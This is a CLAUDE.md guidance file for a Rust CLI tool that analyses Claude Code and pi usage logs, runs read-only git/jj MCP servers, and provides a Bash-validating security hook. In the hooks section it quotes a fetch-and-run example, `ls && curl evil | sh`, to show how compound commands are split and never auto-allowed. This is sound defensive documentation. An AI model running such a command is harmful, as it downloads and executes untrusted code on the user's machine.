# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Project Overview

Moriarty is a Rust CLI tool for analyzing Claude Code logs and API usage. It provides:

- **Claude API pricing analyzer**: Analyzes Claude API usage from log directories and generates detailed cost or token
  reports
- **Pi cost analyzer**: Analyzes pi session logs and generates daily or per-conversation cost or token reports grouped
  by provider and model
- **Terminal graphs**: Renders chart-focused stacked-bar summaries for Claude/API and pi usage via `graphs claude` and
  `graphs pi`
- **MCP servers**: Provides Model Context Protocol servers for read-only git operations, read-only jj operations, and
  project tools
- **Hooks system**: Security integration for validating commands before execution (bash rules, project checks)
- **Project approval TUI**: Interactive interface for approving project-tools commands and checks before execution

## Essential Commands

**Building:**

```bash
cargo build
```

**Running:**

```bash
# Run Claude API pricing analyzer (--dir defaults to ~/.claude/projects)
cargo run -- api-pricing --timezone local|utc
cargo run -- api-pricing --tokens
cargo run -- api-pricing --dir <directory>

# Run pi cost analyzer (--dir defaults to ~/.pi/agent/sessions)
cargo run -- pi cost --timezone local|utc
cargo run -- pi cost --conversations
cargo run -- pi cost --tokens
cargo run -- pi cost --dir <pi-sessions-directory>

# Render chart-focused usage graphs
# (graphs claude --dir defaults to ~/.claude/projects; graphs pi --dir defaults to ~/.pi/agent/sessions)
cargo run -- graphs claude --timezone local|utc
cargo run -- graphs pi --conversations --tokens
cargo run -- graphs pi --dir <pi-sessions-directory>

# Run MCP servers
cargo run -- mcp git-read-only
cargo run -- mcp jj-read-only
cargo run -- mcp project-tools
cargo run -- mcp install  # Install all servers to Claude Code

# Run project approval TUI
cargo run -- approve-project <project-dir>

# Execute hooks (for debugging)
cargo run -- hooks exec

# Report recorded PreToolUse hook results as JSON (filter by --start-time/--end-time, --tool, --result;
# --dir defaults to ~/.local/state/moriarty/hooks)
cargo run -- hooks report --tool Bash --result deny

# Inspect, validate, and author bash/tool rules
cargo run -- rules lint --strict          # report rules the hook silently ignores; warn on shadow/over-broad
cargo run -- rules list-fragments         # show built-in + user pattern fragments
cargo run -- rules schema                 # print a canonical example tool_rules.toml
cargo run -- rules starter                # paste-ready allow-rules for common read-only commands
cargo run -- rules suggest --result ask   # propose anchored rules from frequently-prompted commands (hook logs)
cargo run -- rules replay --result allow  # check a candidate config keeps every prior auto-approval

# Preview how the hook splits and decides a (compound) Bash command
cargo run -- test bash-rules --explain --cwd <dir> '<command>'
```

**Testing:**

```bash
# Run tests (MUST use cargo nextest, NOT cargo test)
cargo nextest run

# Run tests for specific packages
cargo nextest run -p moriarty
cargo nextest run -p claude_logs

# Save yourself a great deal of repeated output
cargo nextest run --no-fail-fast --hide-progress-bar --success-output never --status-level fail --final-status-level flaky
```

**⚠️ CRITICAL**: Tests MUST be run using `cargo nextest`, never `cargo test`. Tests use `std::env::set_var` to set up
isolated XDG config directories, which is only safe when each test runs in its own process. `cargo nextest` runs each
test in a separate process, making this safe and preventing tests from clobbering real config files.

## Architecture

### High-Level Module Organization

**`claude_logs/`** - Claude Code log parsing:

- Independent workspace crate for parsing Claude Code JSONL logs into strongly typed serde models
- The `LogLine` enum covers both core conversation records and newer metadata/event records, including user/assistant
  turns, file-history snapshots, summaries, system entries, queue operations, progress updates, custom titles,
  ai-titles, agent names, last prompts, permission-mode changes, session mode records, attachments, PR-link records
  (associating a session with the GitHub PR Claude Code opened or updated; added in Claude Code 2.1.158+),
  model-refusal-fallback records (when Claude Code retries a refused request on another model, e.g. Fable 5 → Opus 4.8),
  `fallback` content blocks recording the from/to model pair inside an assistant message (both added in Claude Code
  2.1.170+), `image` content blocks inside tool_result content (observed in Claude Code 2.1.170 logs when a tool returns
  a screenshot), `image` file-attachment content (a user `@`-referencing an image file; uses Claude Code's own base64
  `file` envelope with size/dimensions rather than the API's `source` envelope), and a `pendingBackgroundAgentCount`
  field on `turn_duration` system records (the count of background agents still running when the turn completed; added
  in Claude Code 2.1.170+), and `agent_listing_delta` attachments (`AgentListingDelta`, the subagent
  analogue of `deferred_tools_delta`, carrying `added_types`/`added_lines`/`removed_types` plus
  `is_initial` and `show_concurrency_note`; added in Claude Code 2.1.175+), and a `fork-context-ref`
  record (`ForkContextRef`, the first line of a subagent's `subagents/agent-*.jsonl` file, carrying
  `agent_id`/`parent_session_id`/`parent_last_uuid`/`context_length` to record where the subagent forked from its parent
  conversation; added in Claude Code 2.1.175+), and `invoked_skills` attachments (`InvokedSkills`, the skills actually
  run during a turn — e.g. a `/code-review` slash command — each carrying `name`/`path`/`content`, distinct from
  `skill_listing` which only advertises available skills; added in Claude Code 2.1.179+)
- Also owns the structured view of the raw `model` string via `model::Model { family, version }` plus `ModelFamily` and
  `ModelVersion`. Both `cost_analyzer` (for pricing) and `moriarty::api_pricing` (for grouping/display) consume this one
  parser so family/version classification is not duplicated across crates
- Used by `moriarty`'s `api_pricing` module to analyze Claude Code conversation logs

**`cost_report/`** - Shared cost report rendering and filtering:

- Holds shared time filtering, grouped-table rendering, stacked-chart rendering, `ReportMode`, `CostComponents`,
  `TokenCounts`, `MetricComponents`, and report warning helpers used by both cost-report backends
- `FormattedMetricColumns` and `GrandTotalRow` are mode-aware: cost mode formats dollars,
  token mode formats integer token counts with thousands separators, while preserving the same table shape for both
  backends
- `display_summary` renders a consolidated "Summary" section (optional provider table for `pi cost`, model table for
  both backends, and grand total) called by each backend after its inline grouped-table rendering
- `charts.rs` renders deterministic horizontal stacked bars for both time-series and share views, including top-N plus
  `Other`, stable glyph/color assignment, and narrow-terminal truncation without changing the table-report path
- Keeps the output behavior for `api-pricing`, `pi cost`, and the graph commands aligned without forcing the backends
  into a dynamic-column abstraction

**`api_pricing/`** - Claude API usage cost analysis:

- Aggregates either pre-priced `LlmCost` values or raw token counts from `cost_analyzer` into daily buckets (keyed by
  timezone-adjusted date) or per-conversation buckets (keyed by session ID)
- Per-model aggregation uses `ModelMetricsMap` keyed by `claude_logs::Model` (family + parsed version) so report rows
  and chart legend distinguish e.g. "Sonnet 4" from "Sonnet 4.5"; row/legend ordering is family-first (Fable → Opus →
  Sonnet → Haiku) then version-desc via the local `model_sort_key` helper, so within-family Opus 4.x rows sit above Opus
  3 rows automatically. Token mode stays integer-exact end-to-end instead of passing through floating-point helpers
- Unknown Claude models surface as stderr tracing errors via `cost_analyzer`; they are not rendered in the report
- Also prepares `ChartBucket` data for `graphs claude`, reusing the same analyzer output while keeping the existing
  detailed table report unchanged
- Entry points: `api-pricing` and `graphs claude` subcommands in `main.rs`

**`pi_cost/`** - Pi session cost analysis:

- Aggregates either pre-priced `LlmCost` values or raw token counts from `cost_analyzer` into daily buckets or
  per-conversation buckets keyed by normalized session ID
- Uses raw pi `(provider, model)` pairs for row grouping, with deterministic ordering from a
  `BTreeMap<PiModel, MetricComponents>` accumulator inside `PiModelMetricsMap`
- Conversation mode depends on `cost_analyzer::LineWithCost.session_id`, which is attached during the single-pass parse
  from either Claude assistant lines or pi `SessionLine` headers
- Also prepares provider/model `ChartBucket` data for `graphs pi`, reusing the same analyzer output while keeping the
  existing detailed table report unchanged
- Entry points: `pi cost` and `graphs pi` subcommands in `main.rs`

**`pi_logs/`** - Pi session log parsing:

- Independent workspace crate for parsing pi session JSONL logs into strongly typed serde models
- `ToolCallContent` keeps the outer tool-call envelope typed (`id`, `name`, `partial_json`) but preserves `arguments` as
  a raw `BTreeMap<String, JsonBlob>` because pi logs the model-emitted JSON object before tool-side validation; typed
  tool-argument structs are optional post-parse helpers, not the parser's source of truth
- Tool names are raw `String` fields — pi does not validate tool names at the protocol level, so the parser accepts any
  string (including model-invented names like `task` or `remove`) rather than rejecting unknown tools. Tool-specific
  result parsing still routes known tool names by string to their typed result-structs where structured post-parse
  handling is needed; unknown tool results fall through to shape-based deserialization.
- Hermes memory/session-search result details are modeled by their shared envelopes rather than per-action sub-schemas:
  search tools use the `success/count/message/output` summary shape, while `memory` and `skill` are routed by
  `tool_name` first because their error details can collapse to either `{}` or a bare `{error}`; once routed, the parser
  accepts their observed action-agnostic fields plus the real `{}` validation-error payload used by the extension
- Strict by default with `#[serde(deny_unknown_fields)]`, path-aware parse errors, and narrowly documented exceptions
  for shapes that require custom deserialization or specific corrupt-stream tolerance
- Includes a `parse_pi_sessions` binary that recursively smoke-tests a sessions tree by parsing every `*.jsonl` file

**`cost_analyzer/`** - Generic cost-analysis library:

- Workspace crate for recursively scanning JSONL directories, parsing logs in parallel, and deduplicating billable model
  responses
- Core abstractions: `AnalyzableLog` for pluggable log formats, `LlmCost` for input/cache/output cost breakdowns,
  `TokenType` plus `AnalyzableLog::token_count(...) -> Option<u64>` for raw token extraction, `LineWithCost` for
  normalized billable entries, and `AnalysisResult` for returning those deduplicated lines alongside a partial-failure
  flag
- Concrete implementations currently support `pi_logs::PiLogLine` and `claude_logs::LogLine`. Claude log costs are
  calculated in `cost_analyzer` with local Decimal-based Claude pricing helpers (`ClaudeModelPricing::for_model`) that
  consume `&claude_logs::Model`; the family enum itself lives in `claude_logs` so the parser and pricing layer agree on
  classification without depending on `moriarty::api_pricing` internals. Opus 3 vs Opus 4.x share `ModelFamily::Opus`
  and the pricing dispatch reads the parsed `version.major` to pick the OPUS or OPUS_4 tier; `ModelFamily::Fable` maps
  directly to the flat FABLE tier without version dispatch.
- `moriarty::api_pricing` and `moriarty::pi_cost` both delegate all log loading, deduplication, pricing, and raw token
  extraction to this crate; the backends only bucket the returned billable lines into cost or token report rows
- `LineWithCost.session_id` is normalized during parsing so backends can group by conversation without re-reading log
  files; Claude assistant lines provide it inline and pi logs inherit it from the file's `SessionLine`
- Deduplication keeps the highest-cost duplicate for a `(ModelId, LogId)` pair and breaks equal-cost ties by keeping the
  earliest timestamped entry
- Public entry point: `cost_analyzer::analyze_directory(path)`

**`tui/`** - Terminal UI event infrastructure:

- Provides an async event stream (`input_stream`) that maps crossterm terminal events (keys, resize, paste) into the
  internal `Event` / `UIEvent` enum
- Used by `approval_tui/` as its input source

**`mcp/`** - Model Context Protocol servers:

- Three MCP servers: `git_read_only` (status, diff, log, show), `jj_read_only` (status, diff, log, show, op log), and
  `tool_runner` (lint, test, build, format, checks)
- `read_only`: Shared infrastructure used by both `git_read_only` and `jj_read_only`. Provides `CommandResult`,
  `validate_project_dir`, and the generic `run_read_only_command`. It rejects parent-traversal and non-directory targets
  before canonicalizing the working directory, while the per-server wrappers add command-specific flag restrictions
  (`git` forces `--no-optional-locks`, `--no-ext-diff`, and `--no-textconv` while rejecting output-file / no-index
  escape flags; `jj` forces `--ignore-working-copy` and rejects external-tool, config-injection, and repository-override
  flags). Neither server consults `.config/tools.toml` approvals; only `tool_runner` does.
- `tool_runner`'s four command tools (`run_lint`/`run_build`/`run_formatter`/`run_tests`) run a single `[commands]`
  entry via `verify_and_load_project` + `run_command`; its `run_checks` tool runs the project's `[[checks]]` via the
  shared `crate::checks::run_configured_checks` routine — the same approval verification (checks only, not commands),
  resource limits (5-min timeout, 1 MB/check + 10 MB total output caps), and fail-closed semantics as the Stop hook.
  That shared routine is intentionally distinct from `project_config::runner::run_all_checks` (no limits, verifies all
  commands too), which the `moriarty test checks` CLI uses.
- Uses rmcp library with stdio transport for Claude Code integration
- All servers run as stdin/stdout servers that Claude Code can invoke
- `install` command configures all servers in Claude Code's MCP registry
- **Architectural patterns**: git_read_only uses separate MCP tools per command; jj_read_only uses enum-based single
  tool (see MCP Command Patterns below)

**`hooks/`** - Security hook system for Claude Code integration:

- **PreToolUse hook**: Two-tier permission system from `~/.config/moriarty/tool_rules.toml`:
  - `tool_rules`: Permission any tool call (Read, Write, Edit, Bash, etc.) with optional field-level regex matching and
    optional `allow_local = true` checks on `path` / `file_path`. Actions: Allow, Deny, Ask. Checked first. Field values
    that start with the hook input's `cwd` have that prefix stripped before regex matching, so rules can use relative
    paths (e.g., `^src/` instead of absolute paths). `allow_local` canonicalizes the hook `cwd` and the target path; for
    non-existent targets it canonicalizes the deepest existing ancestor and safely rebuilds the missing suffix so `..`
    cannot escape above that ancestor.
  - `bash_rules`: Bash-specific command validation with regex patterns. Actions: Allow, Deny, Modify, Ask,
    ArgumentFilter. Checked when no tool_rule matches a Bash call.
  - **Compound splitting** (`hooks/command_split.rs`): the hook parses each Bash command with `brush-parser` (a
    pure-Rust, `unsafe`-free shell parser) and evaluates every leaf simple-command independently via
    `apply_rules_compound`, then merges the per-leaf decisions. This means a simple `^ls` allow-rule matches the `ls`
    leaf of `ls | wc -l` or `a && ls`, and a dangerous tail can no longer hide behind a safe head
    (`ls && curl evil | sh` ⇒ Ask, never Allow). Merge precedence: any leaf `Denied` ⇒ Deny; else any `Asked`/`NoMatch`
    (or a multi-leaf `Modified`/`ArgumentFiltered`, which are not stitched back together) ⇒ prompt; only an
    all-`Allowed` command ⇒ Allow. A single-leaf command returns its decision verbatim, preserving the `ArgumentFilter`
    re-validation loop.
  - **`real_file_write` cap**: a leaf with a `>`/`>>`/`>|`/`&>` redirect to a real file (not `/dev/null`, not an fd
    duplication like `2>&1`) has any `Allow` capped at Ask, so a read-only allow-rule (`^echo`) can't green-light
    `echo secret > file`.
  - **Bail ⇒ fail safe**: a command containing command substitution `$(...)`, backticks, a value-carrying parameter
    expansion (`${x:-$(…)}`), a subshell, process substitution, a here-doc/here-string, a compound construct
    (`if`/`for`/`while`/`case`/`[[ ]]`/`((…))`/brace group/function), or that fails to parse is un-analyzable: only an
    explicit Deny matching the whole command is honored; every other outcome becomes a prompt.
  - **Bash cwd stripping**: like the tool-rules field stripping, a leaf's in-cwd absolute paths are normalized to their
    relative remainder before matching (no `..`-escaping remainder is rewritten), so `^cat src/` matches
    `cat /abs/cwd/src/x`. `apply_rules(command)` stays the single-command primitive;
    `apply_rules_compound(command, cwd)` is what the hook calls.
  - Evaluation order: tool_rules → bash_rules (for Bash) → passthrough (for non-Bash, defers to Claude Code)
- **Stop hook**: Runs the project's configured checks before allowing execution, delegating to the shared
  `crate::checks::run_configured_checks` routine (see `mcp/` above); it maps the routine's `CheckRunOutcome` onto
  allow/deny
- Structured logging with tracing crate for debugging hook execution. The "PreToolUse hook completed" log event records
  a clean `result` field (`allow`/`deny`/`ask`/`modify`/`passthrough`) classified from the typed `HookOutput` by
  `hooks::result::pretool_result`, alongside `tool_name`, `tool_args`, `cwd`, `rules_hash`, and `rule` — the name of the
  rule whose action produced the decision (empty when no rule decided: passthrough, unconfigured-Ask, merged `NoMatch`
  prompt, or a post-filter re-validation that matched nothing). For a compound command this is the deciding leaf's rule,
  mirroring `merge_results` precedence, so attribution survives the per-leaf merge
- **`hooks report` subcommand**: `hooks/report.rs` reads the JSON-lines hook logs, keeps completed PreToolUse records
  that carry the clean `result` field (legacy lines lacking it are skipped), and aggregates them by the exact
  `(tool name, arguments, result, rule)` key into a JSON report with counts; `rule` is omitted from a row's JSON when no
  rule decided, so legacy rows serialize exactly as before. Reuses `cost_report::TimeRangeFilter` for
  `--start-time`/`--end-time` and supports `--tool` and `--result` filters. `report::aggregate` (used by `hooks report`)
  and `ReportRow` are `pub(crate)`. `report.rs` parses the completion line's `cwd` back into `HookRecord`;
  `rules suggest`/`rules replay` call `report::aggregate_with_cwd`, which joins `cwd` into the grouping key and
  populates `ReportRow.cwd` (a `#[serde(skip)]` field) so each command is re-normalized with the directory it actually
  ran under. `aggregate` keeps `cwd` out of its key and serialization, so `hooks report`'s rows and counts are
  unchanged; rows recorded before `cwd` was logged fall back to an empty cwd (normalization disabled).
- **Compile diagnostics & `rules` authoring tooling**: `BashRuleEngine::compile_with_diagnostics` and
  `ToolRuleEngine::compile_with_diagnostics` return the engine plus a `RuleDiagnostic` for every dropped rule
  (undefined/circular/over-depth fragment, invalid regex, or — tool rules only — a `field`/`pattern` given without its
  partner); `from_config` delegates to them and logs each, preserving the fail-open-per-rule hot path. The
  `crate::rules` command group surfaces them and helps author safe rules: `lint` (errors when a rule the user wrote is
  silently dropped; `--strict` additionally warns on likely-shadowed and over-broad Allow rules), `list-fragments`,
  `schema` (round-tripped against `UserConfig` in tests), `starter` (paste-ready read-only allow-rules that auto-allow
  the north-star command), `suggest` (anchored rules mined from hook logs; each recorded command is split into the leaf
  simple-commands the hook actually evaluates — normalized with the recorded cwd — before pattern generation, so
  compounds yield per-leaf candidates with summed counts, and a bailed command stays whole; `--match exact|prefix|fuzzy`
  picks the shape, where fuzzy clusters leaves by program and generalizes simple-identifier subcommands into a closed
  alternation like `^cargo (build|check)(\s|$)`, falling back to a program prefix; never emits Allow unless
  `--match exact`), and `replay` (re-evaluate recorded Bash decisions against a candidate config — the migration
  acceptance gate is zero lost auto-approvals). `test bash-rules --explain [--cwd <dir>]` prints the per-leaf split,
  normalized text, matching rule (with the expanded pattern), and merged decision via `BashRuleEngine::explain`.
- **Rule-set provenance**: each `PreToolUse hook completed` log line records `rules_hash`, a stable hash of the
  effective config (`UserConfig::effective_hash`, computed once per hook invocation). The hash covers the parsed config
  — tool rules, bash rules, and fragments — re-serialized via `serde_json::to_value` so map keys (`pattern_fragments`,
  an ArgumentFilter `replace` table) sort deterministically while rule order (significant for first-match-wins) is
  preserved; cosmetic edits don't change it but any semantic change does. `rules suggest`/`rules replay` default to only
  the records whose `rules_hash` matches the rule set currently installed at the default config path (for `replay` this
  is the migration source, independent of the `--config` candidate); `--rules-hash <hash>` pins a specific set and
  `--all-rules` disables the filter. Both commands report the active hash and how many records the filter excluded
  (`report::RulesHashFilter`/`HashSkipStats`/`CwdAggregation`); excluded counts are never hidden.
- Security model: Defaults to "Ask" when unconfigured, fail-closed once configured (verification failures block
  execution)

**`approval_tui/`** - Interactive approval interface:

- Multi-screen TUI flow: ProjectOverview → CommandReview → InProjectWarning → Summary → Approved/Cancelled
- Reviews both commands and checks, showing security details (binary path, hash, writability, in-project status)
- Script contents preview for writable in-project scripts
- Atomic file I/O with locking during final approval save

**`project_config/`** - Project configuration and security:

- Three submodules: `config` (loads `.config/tools.toml`), `approvals` (SHA-256 verification), `runner` (verified
  execution)
- **Design asymmetry**: Commands are fixed struct (lint/test/build/format) for MCP, Checks are dynamic `Vec<Check>` for
  user validations
- Tracks config and binary hashes to detect changes; uses file locking for atomic persistence

### Key Design Patterns

**Security Model**:

- **Default to Ask for Bash when unconfigured**: If no bash rules configured, Bash defaults to "Ask". Non-Bash tools
  with no matching tool rules return no decision, deferring to Claude Code's native permission system.
- **Fail-closed when configured**: Once security measures are in place, any verification failure blocks execution:
  - ConfigHashMismatch: tools.toml was modified after approval
  - BinaryHashMismatch: Binary changed (update, corruption, tampering)
  - ItemNotApproved: New command/check added to config
- **SHA-256 verification**: All binaries hashed, symlinks resolved before hashing
- **Dual path tracking**: Stores both original and canonical paths to detect symlink changes
- **Atomic updates**: File locking (fs2 crate) prevents race conditions during approval saves
- **Resource limits**: Check timeouts, concurrency limits, and output size caps prevent abuse
- **Sensitive data protection**: Environment variables matching TOKEN|SECRET|KEY|PASSWORD patterns are redacted

**TUI Architecture**:

- All TUI apps follow same pattern: event loop with async event stream, state machine for screens, ScrollViewState for
  scrolling
- Event handlers are async to support I/O operations (file reads, approval saves)
- State machines use enums for screens with explicit transitions

**MCP Command Patterns**:

- Two architectural approaches for exposing commands via MCP tools:
  - **Separate tools per command** (git_read_only): Each command (status, diff, log, show) is a separate MCP tool with
    its own parameter struct. Better discoverability in Claude Code's tool picker, matches rmcp examples, more
    boilerplate.
  - **Enum-based single tool** (jj_read_only): Single MCP tool with `JjCommand` enum parameter to select the command.
    Less boilerplate, cleaner code, single handler, but Claude Code sees only one tool.
- Trade-offs:
  - **Separate tools**: More verbose but each tool is independently discoverable and documented in MCP's tool list
  - **Enum-based**: More concise and maintainable, but requires understanding the enum variants (still type-safe via
    JSON schema)
- Choice depends on: number of commands, similarity of parameter structures, and whether command discoverability is
  critical

**Configuration** (XDG-compliant):

- `~/.config/moriarty/tool_rules.toml` - Tool and Bash validation rules
- `<project>/.config/tools.toml` - Project commands and checks
- `~/.config/moriarty/project_approvals.toml` - SHA-256 approval hashes
- `~/.local/state/moriarty/hooks/` - Hook execution logs (JSON lines, daily-rotated)

**Repository Root Detection**:

- Approvals are keyed by repository root, not workspace directory
- Detection order: resolving `.jj/repo` (store directory or pointer file) → `git rev-parse --git-common-dir` →
  canonicalized path
- This allows approval sharing across jujutsu workspaces and git worktrees
- For jj: `.jj/repo` is the store directory itself in the main workspace and a pointer file in a secondary workspace.
  Absolute pointers are used as-is; a relative pointer is resolved against the `.jj` directory (jj 0.41+) with a
  fallback to the workspace directory (older jj), so both layouts share one repository root
- For git: uses `--git-common-dir` which returns the shared `.git` directory for all worktrees
- Module: `repository.rs` provides `detect_repository_root()` function

## Development Notes

**Workspace Optimization**: The `my-workspace-hack` crate is managed by cargo-hakari to unify dependencies.

**Shared Test Utilities**: Test helpers used across multiple modules (`setup_isolated_xdg_config`,
`setup_isolated_xdg_state`, `setup_project_dir_with_config`, `write_tools_config`, `create_executable_script`,
`set_test_env_var`, `remove_test_env_var`, `TestEnvVarGuard`) live in
`crates/moriarty/src/test_helpers.rs`. This module is compiled only in test builds (`#[cfg(test)]`). All test
environment mutations go through `apply_test_env_var()` — the module's single `unsafe` block — with process
isolation guaranteed by `cargo nextest`. New test-only helpers needed in more than one module belong here rather than
being duplicated.

**Logging**: Hook execution is logged via tracing as JSON lines to `~/.local/state/moriarty/hooks/` (daily-rotated); the
`hooks report` command consumes these. Cost-report commands log to stderr instead. Sensitive env vars (TOKEN, SECRET,
KEY, PASSWORD) are redacted.

### Doc Comments

Doc comments (`///`) and inline comments (`//`) on Rust items must explain WHY, not WHAT. The function name, signature,
and body already say what the code does; comments should add information that is not visible from the code itself.

**Delete** doc comments that:

- Restate the function name (e.g. `/// Format duration in a readable way` on `fn format_duration`).
- Narrate the body line-by-line (e.g. `/// Appends one row per non-zero-cost model in display order` on a function that
  does exactly that and nothing else).
- Re-describe parameter names (e.g. `/// `grand_total` is the footer total.` on a parameter named `grand_total`).

**Keep or write** doc comments that:

- Explain a non-obvious choice or trade-off (e.g. why an enum arm must come before another to avoid misclassification).
- Document an invariant a caller must uphold (e.g. that two parameters are produced together and the indices are only
  valid against the matching vector).
- Capture context that is not obvious from the surrounding code (e.g. why a sentinel timestamp is safe because the
  variant is never billable).

Applies to source files only. CLAUDE.md and other docs use ordinary prose.

### Error Handling

This project uses the `miette` crate for rich error reporting throughout:

```rust
use miette::{IntoDiagnostic, Result, WrapErr};

fn example() -> miette::Result<()> {
    std::fs::read_to_string("file.txt")
        .into_diagnostic()
        .wrap_err("Failed to read configuration")?;
    Ok(())
}
```

**Conventions**:

- Use `miette::Result` as the return type (qualified usage to avoid shadowing std::Result)
- Use `.into_diagnostic()` to convert std errors
- Use `.wrap_err()` or `.context()` to add contextual error messages
- Use `#[derive(Debug, miette::Diagnostic, thiserror::Error)]` for custom error types

### Imports

#### Import grouping

This project has a particular convention for imports. There should be 3 groups of imports:

- std library,
- 3rd party crates,
- local and workspace crates

You should always use the compact import form.

This looks something like this:

```rust
// standard library imports
use std::{collections::{HashSet, HashMap}, fmt::Display};

// 3rd party crates
use chrono::{Datelike, NaiveDate, TimeZone, Utc};

// local / workspace deps
use super::{analyzer::*, pricing::{ModelMetricsMap, ModelType}, time_filter::TimeRangeFilter};
```

#### Avoid qualified usages

Additionally, you should avoid qualified usages inside of code blocks.

Instead of:

```rust
fn new_hashset() -> std::collections::HashSet<String> {
    std::collections::HashSet::new()
}
```

You should write:

```rust
use std::collections::HashSet;

fn new_hashset() -> HashSet<String> {
    HashSet::new();
}
```

There are two exceptions to this:

1. **Clarity through qualification**: Use qualified references when they make the code more clear. Examples:
   - `mpsc::channel()` vs `oneshot::channel()` - clarifies which channel type
   - `tokio::spawn()` vs `rayon::spawn()` - clarifies which runtime
2. **Avoiding prelude shadowing**: Use qualified references for types that would shadow std prelude items:
   - `miette::Result` - Never shadow `std::prelude::Result`
   - `miette::Error` - Never shadow `std::error::Error`
   - Custom `Result` type aliases should be avoided in favor of explicit `miette::Result`

#### Always do imports at the top of the module

Import go at the top of the file not in individual code blocks. The only exception to this is something like diesel's
generated table functions, they would all collide with each other making the code difficult to understand. Diesel is not
currently in use in the code base.

### Serde Conventions

The codebase uses specific serde attributes for protocol compatibility:

```rust
#[derive(Deserialize)]
#[serde(deny_unknown_fields)]  // Fail on unexpected fields
#[serde(tag = "type")]          // Tagged enum variants
#[serde(rename_all = "camelCase")]  // Match JSON conventions
struct Example {
    #[serde(skip_serializing_if = "Option::is_none")]  // Omit None values
    optional_field: Option<String>,
}
```

**Important**: Always use `#[serde(deny_unknown_fields)]` when deserializing Claude Code protocol messages (hooks, log
parsing) to catch when Claude Code updates have added new fields that this codebase doesn't yet handle.

**Exceptions**: in `pi_logs`, two categories of struct legitimately omit `deny_unknown_fields`:

Also, do not force `rename_all = "camelCase"` onto parser structs whose upstream wire schema is not camelCase. Preserve
the on-disk protocol exactly, even when that means snake_case fields like `GitReadOnlyArgs.project_dir`.

1. **`serde(flatten)` of an internally-tagged enum**: when a struct flattens an enum that uses `#[serde(tag = "...")]`
   without a `content` field, the inner tag appears at the same JSON level as the outer struct's fields and serde's
   flatten codegen does not register it as claimed; a strict outer struct then rejects it as unknown at runtime.
   `WebSearchResultsData` is the only struct in this category. It keeps the flattened internally tagged wire shape, but
   restores strict outer-key validation with a manual deserializer. _Adjacently_ tagged flatten targets (those with both
   `tag` and `content`) do not hit this collision, so structs like `CustomLine` and `CustomMessageLine` keep derived
   `deny_unknown_fields` handling. Each exception must carry an inline comment naming the limitation.
2. **Corrupt-stream tolerance**: tool-argument structs (e.g. `EditArgs`, `EditReplacement`, `GrepArgs`) deliberately
   omit it to tolerate completed-but-corrupted or hallucinated assistant streams that emit malformed sibling keys. The
   same goal is also met at finer granularity by field-level aliases (for example `FindArgs.limit` accepting malformed
   `.limit` while keeping the rest of the struct strict) and untagged fallback enums (`EditEntry::Fragment` absorbs raw
   JSON tokens in an `edits` array; `MaybeU32::Garbage` absorbs string-typed corruption of numeric tool-call arguments).
   Each such exception must carry an inline comment naming the observed failure mode.

## Suggesting Updates to CLAUDE.md

When you make significant changes to the codebase that introduce new patterns, conventions, or architectural decisions,
you MUST suggest updates to this file.

**CRITICAL**: You MUST make the change with the real edit tool, not just propose prose. When suggesting a CLAUDE.md
update in your response, clearly name the topic you think should be documented, then immediately apply the matching edit
to `CLAUDE.md` with the actual tool call.

**Examples of significant changes that warrant CLAUDE.md updates**:

- New architectural patterns or design decisions
- New conventions for code organization or style
- Changes to the build system or testing strategy
- New security considerations or validation approaches
- Changes to configuration file formats or locations
- New error handling patterns or async patterns

**What NOT to document**:

- Implementation details of specific features
- Temporary workarounds
- Details that are better suited for code comments
- Information that will become stale quickly

The goal is to keep CLAUDE.md focused on information that helps understand how to work with the codebase effectively
across sessions.

## Finishing

After you have modified code, you are not allowed to stop until all of the quality checks have passed. If you need to
ask the user a question, use the dedicated user-question tool rather than writing the question in plain text and then
waiting for the user's next input.
